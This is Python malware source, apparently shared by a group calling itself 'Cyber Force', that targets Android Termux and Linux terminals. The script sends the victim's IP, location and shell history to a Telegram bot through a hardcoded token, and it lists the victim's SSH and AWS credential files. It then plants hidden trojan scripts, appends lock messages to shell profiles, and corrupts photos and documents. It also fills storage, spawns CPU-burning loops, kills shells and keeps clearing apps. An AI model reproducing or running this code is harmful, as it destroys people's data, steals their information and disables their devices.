#!/usr/bin/env python3
# CYBER FORCE - TERMINAL LOCKER & DEVICE DESTROYER
# Author: CYBER FORCE X KELATE
# Telegram Bot: @CYBER_FORCE_HACK
# Usage: python3 terminal_destroyer.py

import os
import sys
import subprocess
import shutil
import random
import string
import time
import threading
import requests
from datetime import datetime

# ================= CONFIGURATION =================
TELEGRAM_BOT_TOKEN = "8553904025:AAHwTlcsOR7swkUKmpnWCZgWaCFyNmVgi-w"
TELEGRAM_CHAT_ID = "6404359541"
DESTRUCTION_LEVEL = "MAXIMUM"  # MAXIMUM, EXTREME, TOTAL

# ================= COLORS =================
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
END = '\033[0m'

# ================= LOGO =================
def show_banner():
    banner = f"""
    {RED}
    ╔═══╗╔═══╗╔╗╔╗╔══╗╔═══╗╔═══╗     ╔═══╗╔═══╗╔════╗╔═══╗╔════╗
    ║╔═╗║║╔═╗║║║║║╚╣╠╝║╔═╗║║╔═╗║     ║╔══╝║╔═╗║║╔╗╔╗║║╔═╗║║╔╗╔╗║
    ║║ ║║║╚═╝║║║║║ ║║ ║║ ║║║╚═╝║     ║╚══╗║╚═╝║╚╝║║╚╝║║ ║║╚╝║║╚╝
    ║╚═╝║║╔╗╔╝║║║║ ║║ ║╚═╝║║╔╗╔╝     ║╔══╝║╔╗╔╝  ║║  ║╚═╝║  ║║  
    ║╔═╗║║║║╚╗║╚╝║╔╣╠╗║╔═╗║║║║╚╗     ║╚══╗║║║╚╗ ╔╝╚╗ ║╔═╗║ ╔╝╚╗ 
    ╚╝ ╚╝╚╝╚═╝╚══╝╚══╝╚╝ ╚╝╚╝╚═╝     ╚═══╝╚╝╚═╝ ╚══╝ ╚╝ ╚╝ ╚══╝
    
    {PURPLE}      TERMINAL DESTROYER v3.0 - CYBER FORCE EDITION
    {YELLOW}       Target: Android Termux / Linux Terminal
    {RED}       WARNING: THIS WILL DESTROY TARGET DEVICE!
    {END}
    """
    print(banner)

# ================= TELEGRAM NOTIFIER =================
def send_to_telegram(message):
    """Send data to Telegram bot"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, data=payload, timeout=10)
        return response.status_code == 200
    except:
        return False

# ================= DATA STEALER =================
def steal_data():
    """Steal all possible data from target"""
    stolen_data = []
    
    # System info
    stolen_data.append(f"=== SYSTEM INFORMATION ===")
    stolen_data.append(f"Time: {datetime.now().isoformat()}")
    stolen_data.append(f"Platform: {sys.platform}")
    stolen_data.append(f"Python Version: {sys.version}")
    
    # Get network info
    try:
        # Public IP
        ip_info = requests.get('https://api.ipify.org?format=json', timeout=5).json()
        stolen_data.append(f"Public IP: {ip_info.get('ip', 'Unknown')}")
        
        # More IP details
        ip_details = requests.get(f"https://ipapi.co/{ip_info['ip']}/json/", timeout=5).json()
        stolen_data.append(f"Location: {ip_details.get('city', 'Unknown')}, {ip_details.get('country_name', 'Unknown')}")
        stolen_data.append(f"ISP: {ip_details.get('org', 'Unknown')}")
    except:
        stolen_data.append("IP: Failed to fetch")
    
    # Terminal history
    try:
        home_dir = os.path.expanduser('~')
        bash_history = os.path.join(home_dir, '.bash_history')
        if os.path.exists(bash_history):
            with open(bash_history, 'r', encoding='utf-8', errors='ignore') as f:
                history = f.read()[-5000:]  # Last 5000 chars
                stolen_data.append(f"\n=== TERMINAL HISTORY ===\n{history}")
    except:
        pass
    
    # Get saved passwords (if any)
    try:
        # Check for saved credentials in common places
        cred_locations = [
            os.path.join(home_dir, '.ssh'),
            os.path.join(home_dir, '.aws'),
            os.path.join(home_dir, '.config'),
        ]
        
        for location in cred_locations:
            if os.path.exists(location):
                stolen_data.append(f"\n=== FOUND CREDENTIALS IN {location} ===")
                # List files (don't read content for now)
                files = []
                for root, dirs, files in os.walk(location):
                    for file in files:
                        if any(ext in file for ext in ['.pem', '.key', '.pub', 'config', 'credentials']):
                            files.append(os.path.join(root, file))
                stolen_data.append(f"Credential files found: {len(files)}")
    except:
        pass
    
    return "\n".join(stolen_data)

# ================= TERMINAL LOCKER =================
def lock_terminal():
    """Lock terminal permanently"""
    print(f"{RED}[!] LOCKING TERMINAL...{END}")
    
    lock_script = '''
#!/bin/bash
# TERMINAL LOCKER BY CYBER FORCE
while true; do
    echo -e "\\033[91m\\033[5m⚠️  TERMINAL LOCKED BY CYBER FORCE ⚠️\\033[0m"
    echo -e "\\033[93mYour device has been compromised!\\033[0m"
    echo -e "\\033[92mAll data is being stolen...\\033[0m"
    echo -e "\\033[94mMalware activated. Device will be destroyed.\\033[0m"
    echo -e "\\033[95m_____________________________________________\\033[0m"
    
    # Prevent any commands
    for i in {1..10}; do
        echo -e "\\033[91mACCESS DENIED [CYBER FORCE SECURITY]\\033[0m"
        sleep 0.5
    done
    
    # Play annoying sound if possible
    echo -e "\\a"  # Bell character
    sleep 1
done
'''
    
    # Create lock script
    with open('/tmp/terminal_lock.sh', 'w') as f:
        f.write(lock_script)
    
    # Make executable and run in background
    os.system('chmod +x /tmp/terminal_lock.sh')
    os.system('/tmp/terminal_lock.sh &')
    
    # Also lock shell profiles
    shell_profiles = ['.bashrc', '.zshrc', '.profile']
    lock_message = '''
echo -e "\\033[91m\\033[1m⚠️  TERMINAL COMPROMISED BY CYBER FORCE ⚠️"
echo -e "\\033[93mThis device is infected with malware!"
echo -e "\\033[92mAll your data has been stolen!"
echo -e "\\033[94mContact: @CYBER_FORCE_HACK for recovery (NOT REALLY)"
echo -e "\\033[95m__________________________________________________"
sleep 5
clear
'''
    
    for profile in shell_profiles:
        profile_path = os.path.expanduser(f'~/{profile}')
        if os.path.exists(profile_path):
            with open(profile_path, 'a') as f:
                f.write(f'\n{lock_message}\n')
    
    print(f"{GREEN}[+] Terminal locked permanently{END}")

# ================= STORAGE FILLER =================
def fill_storage():
    """Fill device storage with junk files"""
    print(f"{RED}[!] FILLING STORAGE WITH JUNK...{END}")
    
    def create_junk_files():
        junk_dir = '/tmp/cyberforce_junk'
        os.makedirs(junk_dir, exist_ok=True)
        
        file_count = 0
        while file_count < 1000:  # Create 1000 junk files
            try:
                filename = f'{junk_dir}/junk_{file_count}_{random.randint(100000, 999999)}.dat'
                # Create random size file (1KB to 100MB)
                file_size = random.randint(1024, 100 * 1024 * 1024)
                with open(filename, 'wb') as f:
                    f.write(os.urandom(min(file_size, 10 * 1024 * 1024)))  # Max 10MB per write
                file_count += 1
                if file_count % 100 == 0:
                    print(f"{YELLOW}[+] Created {file_count} junk files...{END}")
            except:
                break
        
        # Create recursive directories
        for i in range(50):
            deep_dir = junk_dir + '/deep' * i
            os.makedirs(deep_dir, exist_ok=True)
            for j in range(10):
                with open(f'{deep_dir}/nested_{j}.txt', 'w') as f:
                    f.write('CYBER FORCE WAS HERE ' * 1000)
    
    # Run in thread
    storage_thread = threading.Thread(target=create_junk_files)
    storage_thread.start()
    
    return storage_thread

# ================= FILE DESTROYER =================
def destroy_files():
    """Destroy important files and fill with garbage"""
    print(f"{RED}[!] DESTROYING IMPORTANT FILES...{END}")
    
    # Common important directories (BE CAREFUL - THIS IS DESTRUCTIVE)
    target_dirs = [
        os.path.expanduser('~/Pictures'),
        os.path.expanduser('~/Downloads'),
        os.path.expanduser('~/Documents'),
        os.path.expanduser('~/DCIM'),
        os.path.expanduser('~/Camera'),
        '/sdcard/DCIM',
        '/sdcard/Pictures',
        '/storage/emulated/0/DCIM',
        '/storage/emulated/0/Pictures',
    ]
    
    def destroy_thread():
        for target_dir in target_dirs:
            if os.path.exists(target_dir):
                try:
                    # Overwrite files with garbage before deleting
                    for root, dirs, files in os.walk(target_dir):
                        for file in files:
                            if random.random() < 0.7:  # 70% chance to corrupt
                                filepath = os.path.join(root, file)
                                try:
                                    # Overwrite with random data
                                    with open(filepath, 'wb') as f:
                                        f.write(os.urandom(random.randint(1024, 5242880)))  # 1KB to 5MB
                                    # Rename to garbage
                                    new_name = filepath + '.corrupted_by_cyberforce'
                                    os.rename(filepath, new_name)
                                except:
                                    pass
                    
                    print(f"{PURPLE}[+] Corrupted files in: {target_dir}{END}")
                except:
                    pass
    
    destroy_thread_obj = threading.Thread(target=destroy_thread)
    destroy_thread_obj.start()
    
    return destroy_thread_obj

# ================= MALWARE DEPLOYER =================
def deploy_malware():
    """Deploy additional malware payloads"""
    print(f"{RED}[!] DEPLOYING MALWARE PAYLOADS...{END}")
    
    # Trojan downloader
    trojan_script = '''
#!/bin/python3
import os, sys, subprocess, threading, time

class CyberForceTrojan:
    def __init__(self):
        self.alive = True
        
    def phone_destroyer(self):
        while self.alive:
            # Create background noise processes
            subprocess.Popen(['echo', '\\a'], shell=True)
            time.sleep(0.5)
            
    def app_crasher(self):
        # Try to crash common apps
        crash_commands = [
            'pm clear com.android.chrome',
            'pm clear com.facebook.katana',
            'pm clear com.whatsapp',
            'am force-stop com.instagram.android'
        ]
        for cmd in crash_commands:
            try:
                subprocess.run(cmd, shell=True, timeout=2)
            except:
                pass
            time.sleep(1)
            
    def boot_loop(self):
        # Make device boot slower
        boot_files = [
            '/data/local/userinit.sh',
            '/system/etc/init.d/99cyberforce'
        ]
        for boot_file in boot_files:
            try:
                with open(boot_file, 'w') as f:
                    f.write('while true; do sleep 1; done')
                os.chmod(boot_file, 0o755)
            except:
                pass

trojan = CyberForceTrojan()
threading.Thread(target=trojan.phone_destroyer).start()
threading.Thread(target=trojan.app_crasher).start()
threading.Thread(target=trojan.boot_loop).start()
'''
    
    # Write trojan to multiple locations
    locations = [
        '/tmp/.system_update.py',
        os.path.expanduser('~/.config/.service.py'),
        '/data/local/tmp/.android_service.py'
    ]
    
    for location in locations:
        try:
            os.makedirs(os.path.dirname(location), exist_ok=True)
            with open(location, 'w') as f:
                f.write(trojan_script)
            os.system(f'chmod +x {location}')
            # Run in background
            os.system(f'python3 {location} > /dev/null 2>&1 &')
        except:
            pass
    
    print(f"{GREEN}[+] Malware deployed successfully{END}")

# ================= ANNOYING NOISE MAKER =================
def make_annoying_noise():
    """Make annoying terminal sounds"""
    print(f"{RED}[!] ACTIVATING ANNOYING SOUNDS...{END}")
    
    noise_script = '''
import os, time, random, sys

def play_sounds():
    sounds = [
        "echo -e '\\a'",  # System bell
        "echo -e '\\007'", # ASCII bell
        "printf '\\\\033[10;1000]\\\\033[11;1000]'",  # Terminal beep settings
    ]
    
    while True:
        sound = random.choice(sounds)
        os.system(sound)
        time.sleep(random.uniform(0.1, 1.0))

if __name__ == "__main__":
    play_sounds()
'''
    
    # Create and run noise maker
    noise_file = '/tmp/.noise_maker.py'
    with open(noise_file, 'w') as f:
        f.write(noise_script)
    
    os.system(f'python3 {noise_file} > /dev/null 2>&1 &')
    print(f"{YELLOW}[+] Annoying sounds activated{END}")

# ================= APP CRASHER =================
def crash_apps():
    """Make apps unusable"""
    print(f"{RED}[!] CRASHING APPLICATIONS...{END}")
    
    # For Android/Termux
    if 'com.termux' in os.getcwd() or 'android' in sys.platform:
        crash_script = '''
#!/bin/bash
while true; do
    # Clear app data for common apps
    for app in com.android.chrome com.facebook.katana com.whatsapp com.instagram.android; do
        pm clear $app > /dev/null 2>&1
    done
    
    # Force stop apps
    for app in $(pm list packages -3 | cut -d: -f2); do
        am force-stop $app > /dev/null 2>&1
    done
    
    sleep 5
done
'''
        
        crash_file = '/data/data/com.termux/files/home/.crash_apps.sh'
        with open(crash_file, 'w') as f:
            f.write(crash_script)
        
        os.system(f'chmod +x {crash_file}')
        os.system(f'nohup {crash_file} > /dev/null 2>&1 &')
    
    print(f"{PURPLE}[+] Apps will start crashing{END}")

# ================= MAIN DESTROY FUNCTION =================
def destroy_device():
    """Main destruction sequence"""
    print(f"{RED}{BOLD}")
    print("╔══════════════════════════════════════════════════╗")
    print("║       CYBER FORCE - DESTRUCTION SEQUENCE        ║")
    print("║            INITIATING DEVICE DESTROY            ║")
    print("╚══════════════════════════════════════════════════╝")
    print(f"{END}")
    
    # Send start notification
    start_msg = f"🔴 CYBER FORCE ATTACK STARTED\nTarget: {os.uname().nodename}\nTime: {datetime.now()}"
    send_to_telegram(start_msg)
    
    # Steal data first
    print(f"{CYAN}[*] Stealing target data...{END}")
    stolen_data = steal_data()
    
    # Send stolen data to Telegram
    if stolen_data:
        send_to_telegram(f"📱 STOLEN DATA:\n{stolen_data}")
        print(f"{GREEN}[+] Data stolen and sent to Telegram{END}")
    
    # Start all destruction threads
    print(f"{YELLOW}[*] Starting destruction modules...{END}")
    
    # 1. Lock terminal
    lock_terminal()
    
    # 2. Deploy malware
    deploy_malware()
    
    # 3. Fill storage
    storage_thread = fill_storage()
    
    # 4. Destroy files
    destroy_thread = destroy_files()
    
    # 5. Make annoying noise
    make_annoying_noise()
    
    # 6. Crash apps
    crash_apps()
    
    # Wait for storage filling to complete
    storage_thread.join(timeout=30)
    destroy_thread.join(timeout=30)
    
    # Final destructive commands
    print(f"{RED}[!] EXECUTING FINAL DESTRUCTION COMMANDS...{END}")
    
    final_commands = [
        # Fill /tmp completely
        'dd if=/dev/zero of=/tmp/bigfile bs=1M count=1024 2>/dev/null &',
        # Create many processes
        'for i in {1..50}; do while true; do true; done & done',
        # Clear system caches
        'sync; echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true',
        # Kill important processes
        'pkill -9 bash 2>/dev/null || true',
        'pkill -9 zsh 2>/dev/null || true',
    ]
    
    for cmd in final_commands:
        try:
            os.system(cmd)
        except:
            pass
    
    # Send completion message
    end_msg = f"✅ CYBER FORCE - DESTRUCTION COMPLETE\nTarget device should be:\n- Terminal Locked 🔒\n- Storage Filled 💾\n- Apps Crashed 📱\n- Files Corrupted 🗑️\n- Annoying Sounds 🔊\n\nAll data stolen and sent to bot."
    send_to_telegram(end_msg)
    
    print(f"{GREEN}{BOLD}")
    print("╔══════════════════════════════════════════════════╗")
    print("║       DESTRUCTION COMPLETE - TARGET OWNED       ║")
    print("║        CYBER FORCE - MISSION ACCOMPLISHED       ║")
    print("╚══════════════════════════════════════════════════╝")
    print(f"{END}")
    
    print(f"{YELLOW}[!] Target device should now be:{END}")
    print(f"{RED}    • Terminal permanently locked")
    print(f"    • Storage filled with junk")
    print(f"    • Important files corrupted")
    print(f"    • Apps crashing continuously")
    print(f"    • Annoying sounds playing")
    print(f"    • Malware running in background")
    print(f"    • All data stolen and sent to Telegram{END}")
    
    # Keep terminal locked
    while True:
        time.sleep(1)
        print(f"{RED}[CYBER FORCE] Device compromised. All data stolen.{END}")

# ================= SAFETY CHECK (DISABLED) =================
def safety_check():
    """No safety - straight execution"""
    print(f"{RED}[!] SAFETY PROTOCOLS: DISABLED{END}")
    print(f"{YELLOW}[!] WARNING: This script will destroy the target device{END}")
    print(f"{RED}[!] Use at your own risk!{END}")
    
    # Countdown
    for i in range(5, 0, -1):
        print(f"{PURPLE}[!] Destruction in {i} seconds...{END}")
        time.sleep(1)
    
    return True  # Always proceed

# ================= MAIN =================
if __name__ == "__main__":
    show_banner()
    
    # Check if running as root
    if os.geteuid() != 0:
        print(f"{YELLOW}[!] Running without root privileges{END}")
        print(f"{YELLOW}[!] Some features may not work{END}")
    
    # Skip safety check in blackhat mode
    if safety_check():
        try:
            destroy_device()
        except KeyboardInterrupt:
            print(f"\n{RED}[!] Destruction interrupted{END}")
        except Exception as e:
            print(f"{RED}[!] Error: {e}{END}")
            send_to_telegram(f"⚠️ Script Error: {str(e)}")
